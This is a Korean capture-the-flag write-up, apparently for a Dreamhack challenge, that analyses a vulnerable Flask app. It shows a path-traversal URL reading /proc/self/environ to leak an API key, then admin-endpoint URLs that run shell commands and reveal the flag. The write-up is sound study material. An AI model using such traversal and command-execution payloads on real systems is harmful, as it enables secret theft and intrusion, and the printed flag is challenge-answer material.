https://teberr.notion.site/File-Vulnerability-Advanced-For-Linux-53a3e32c1a9e469899491c57cd238ff2

# 문제파일 다운로드

![문제파일.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9f5a6747-a3ff-44d2-a440-5cfb60e7c82b/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC.png)

File Vulnerability Advanced for linux 문제파일을 다운로드 받으면 도커파일과 app폴더, nginx 폴더가 존재한다.

그 중에서 웹 서버의 주요 내용은 app 폴더의 main.py에 존재하고있다. 그 코드를 분석하자.

# 코드 분석 및 공격 설계

```python
import os, subprocess
from functools import wraps
from flask import Flask, request

app = Flask(__name__)
API_KEY = os.environ.get('API_KEY', None)

def key_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.args.get('API_KEY', None)
        if API_KEY and apikey:
            if apikey == API_KEY:
                return view(**kwargs)
        return 'Access Denined !'
    return wrapped_view

@app.route('/', methods=['GET'])
def index():
    return 'API Index'

@app.route('/file', methods=['GET'])
def file():
    path = request.args.get('path', None)
    if path:
        data = open('./files/' + path).read()
        return data
    return 'Error !'

@app.route('/admin', methods=['GET'])
@key_required
def admin():
    cmd = request.args.get('cmd', None)
    if cmd:
        result = subprocess.getoutput(cmd)
        return result
    else:
        return 'Error !'

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

코드를 크게 나누면 4개의 부분이 있다.

- key_required
- index
- file
- admin

차례로 살펴보자

### key_required

```python
API_KEY = os.environ.get('API_KEY', None)

def key_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.args.get('API_KEY', None)
        if API_KEY and apikey:
            if apikey == API_KEY:
                return view(**kwargs)
        return 'Access Denined !'
    return wrapped_view
```

`환경변수에서 가져온 API_KEY값`과 사용자가 `get으로 전달한 API_KEY` 값과 같은지 비교해주는 함수이다. API_KEY값은 환경변수에서 가져오고 있고 환경변수는 일반 권한으로도 접근할 수 있으므로 환경변수를 읽을 수 있으면 API_KEY값을 알 수 있다.

### index

```python
@app.route('/', methods=['GET'])
def index():
    return 'API Index'
```

![index.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c9604959-97f2-4f5f-bf2b-5d88c192fcf9/index.png)

초기 Index 페이지이다.

### file

```python
@app.route('/file', methods=['GET'])
def file():
    path = request.args.get('path', None)
    if path:
        data = open('./files/' + path).read()
        return data
    return 'Error !'
```

사용자가 path 에 전달한 값으로 ./files/path 파일을 읽어서 보여준다. 사용자가 전달한 path를 검증하는 내용이 없으므로 pathTraversal을 통해 원하는 위치의 파일명만 안다면 그 파일을 읽을 수 있다.

### admin()

```python
@app.route('/admin', methods=['GET'])
@key_required
def admin():
    cmd = request.args.get('cmd', None)
    if cmd:
        result = subprocess.getoutput(cmd)
        return result
    else:
        return 'Error !'
```

사용자가 cmd로 전달한 값을 실행시켜 그 실행 결과를 리턴해준다. 이 admin()페이지에 접근하려면 key_required를 통과해야 하므로 API_KEY가 필요하다. 

즉 이 네 페이지를 종합하면 공격은 다음과 같이 이루어진다.

1. file 페이지에서 pathTraversal을 통해 환경변수값이 써져있는 /proc/self/environ을 읽어 API_KEY값을 알아낸다.
2. 알아낸 API_KEY값을 이용해 admin()페이지에서 flag 파일을 찾아 flag 값을 알아내면 된다.

# 공격

먼저 file 페이지에서 path 값에 원하는 값을 넣어 파일이 잘 출력되는지 알아보고자 했다.

![files.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ad599941-e16d-4901-a9db-bc60160c3138/files.png)

다운로드 받은 파일을 보면 files 폴더에서 test.txt 파일이 있는 것을 확인할 수 있다.

![test파일.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3b7fe076-8827-4e7b-a65b-d663edda06fe/test%ED%8C%8C%EC%9D%BC.png)

따라서 이 파일을 잘 읽어들이는지 테스트를 해보자.

![test.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/747b8bbb-a5c2-483c-a5f1-a2e6cf26ffb4/test.png)

```jsx
test
```

[`http://host3.dreamhack.games:10365/file?path=test.txt`](http://host3.dreamhack.games:10365/file?path=test.txt) 를 통해서 테스트 해본 결과 잘 출력되는 것을 확인할 수 있다. 이제 환경 변수를 출력해보자.

![api키 유출.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/41310f44-439f-49a6-8b9d-57094a3e62e9/api%ED%82%A4_%EC%9C%A0%EC%B6%9C.png)

```jsx
NGINX_WORKER_PROCESSES=1
UWSGI_CHEAPER=2
NGINX_MAX_UPLOAD=0
SUPERVISOR_GROUP_NAME=uwsgi
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PYTHON_SETUPTOOLS_VERSION=57.5.0
UWSGI_PROCESSES=16
port=80
LANG=C.UTF-8TERM=xterm
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockcontainer=podmanPYTHON_VERSION=3.8.12
PYTHON_PIP_VERSION=21.2.4
SUPERVISOR_ENABLED=1
UWSGI_INI=/app/uwsgi.ini
API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f
HOME=/root
STATIC_PATH=/app/static
GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
PYTHONPATH=/app
STATIC_URL=/static
SUPERVISOR_PROCESS_NAME=uwsgi
PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.py
LISTEN_PORT=80
HOSTNAME=localhost
PWD=/app
STATIC_INDEX=0
```

[`http://host3.dreamhack.games:10365/file?path=../../../../../../../../proc/self/environ`](http://host3.dreamhack.games:10365/file?path=../../../../../../../../proc/self/environ) 를 통해서 환경변수 값을 출력해본 결과 API_KEY 값은 `d22cb18e86fc9e23996650150461c9f794ad3a4f` 임을 확인할 수 있다. 이제 admin 페이지에서 원하는 명령어를 실행 시킬수 있다.

![현재 위치 ls 수행.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5cb6571c-0105-45f4-8ffc-1ea0e38d6df9/%ED%98%84%EC%9E%AC_%EC%9C%84%EC%B9%98_ls_%EC%88%98%ED%96%89.png)

```jsx
__pycache__ files main.py nginx.conf prestart.sh requirements.txt uwsgi.ini
```

[`http://host3.dreamhack.games:10365/admin?API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f&&cmd=ls`](http://host3.dreamhack.games:10365/admin?API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f&&cmd=ls) 를 이용해서 ls 명령어를 실행시켜본 결과 flag 파일이 존재하지 않는 것을 확인했다.. root 페이지부터 찾아보자.

![flag 파일이 루트에 존재.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/43ecd1c9-6256-40e0-9754-a1e3d7a2c3f9/flag_%ED%8C%8C%EC%9D%BC%EC%9D%B4_%EB%A3%A8%ED%8A%B8%EC%97%90_%EC%A1%B4%EC%9E%AC.png)

```jsx
total 124 
dr-xr-xr-x 1 root root 4096 Dec 5 17:01 . 
dr-xr-xr-x 1 root root 4096 Dec 5 17:01 .. 
drwxr-xr-x 1 root root 4096 Dec 5 17:01 app 
drwxr-xr-x 2 root root 4096 Oct 12 2021 bin 
drwxr-xr-x 2 root root 4096 Oct 3 2021 boot 
drwxr-xr-x 8 root root 2540 Dec 5 17:01 dev 
-rwxr-xr-x 1 root root 1936 Oct 26 2021 entrypoint.sh 
drwxr-xr-x 1 root root 4096 Dec 5 17:01 etc 
---x--x--x 1 root root 16608 Jan 26 2022 flag 
drwxr-xr-x 3 root root 4096 Jan 26 2022 home 
-rw-r--r-- 1 root root 3452 Oct 26 2021 install-nginx-debian.sh 
drwxr-xr-x 8 root root 4096 Oct 12 2021 lib 
drwxr-xr-x 2 root root 4096 Oct 11 2021 lib64 
drwxr-xr-x 2 root root 4096 Oct 11 2021 media 
drwxr-xr-x 2 root root 4096 Oct 11 2021 mnt 
drwxr-xr-x 2 root root 4096 Oct 11 2021 opt 
dr-xr-xr-x 109 root root 0 Dec 5 17:01 proc 
drwx------ 3 root root 4096 Jan 26 2022 root 
drwxr-xr-x 1 root root 4096 Dec 5 17:01 run 
drwxr-xr-x 2 root root 4096 Oct 12 2021 sbin 
drwxr-xr-x 2 root root 4096 Oct 11 2021 srv 
-rwxr-xr-x 1 root root 404 Oct 26 2021 start.sh 
dr-xr-xr-x 11 root root 0 Dec 5 17:01 sys 
drwxrwxrwt 1 root root 4096 Dec 5 17:01 tmp 
drwxr-xr-x 1 root root 4096 Oct 11 2021 usr 
-rwxr-xr-x 1 root root 3146 Oct 26 2021 uwsgi-nginx-entrypoint.sh 
drwxr-xr-x 1 root root 4096 Oct 11 2021 var
```

[`http://host3.dreamhack.games:10365/admin?API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f&&cmd=ls -al /`](http://host3.dreamhack.games:10365/admin?API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f&&cmd=ls%20-al%20/) root 페이지를 확인하면 flag 파일이 실행권한만 가진채로 존재하는 것을 확인할 수 있다. 따라서 이 flag 파일을 실행시키자.

![플래그값.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/53e2f3be-94e9-4535-bd75-c850430ae2a6/%ED%94%8C%EB%9E%98%EA%B7%B8%EA%B0%92.png)

```jsx
DH{2a4ff4e94d09793c662d1bd7ec5d497d7b190c6f}
```

[`http://host3.dreamhack.games:10365/admin?API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f&&cmd=/flag`](http://host3.dreamhack.games:10365/admin?API_KEY=d22cb18e86fc9e23996650150461c9f794ad3a4f&&cmd=/flag) 를 이용해서 root 위치의 flag 파일을 실행시키면 플래그 값인 `DH{2a4ff4e94d09793c662d1bd7ec5d497d7b190c6f}` 를 알아낼 수 있다.
